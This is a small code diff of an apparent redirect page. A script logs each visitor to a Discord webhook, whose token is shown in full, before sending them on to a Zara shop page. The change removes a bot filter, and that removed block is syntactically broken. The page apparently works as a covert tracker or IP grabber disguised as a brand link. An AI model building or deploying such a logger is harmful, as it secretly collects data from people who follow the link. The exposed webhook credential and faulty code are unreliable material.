@@ -1,12 +1,4 @@
 <script>
-// --- BOT FILTER ---
-const botPattern = /bot|spider|crawl|slurp|facebookexternalhit|discordbot|headless/i;
-if (botPattern.test(navigator.userAgent)) {
-    console.log("Bot detected. Redirecting without logging.");
-    window.location.replace(destination);
-    return; // Stop the script here
-}
-
     async function logAndGo() {
         const webhookURL = "https://discord.com/api/webhooks/1494944448767983697/KzHvXGmFkSIWds1vzdEDuySWPA6XuDyAwuddTBol9QJbaw5NLDjD_JdBp-LNWgizpBvC";
         const destination = "https://www.zara.com/my/";
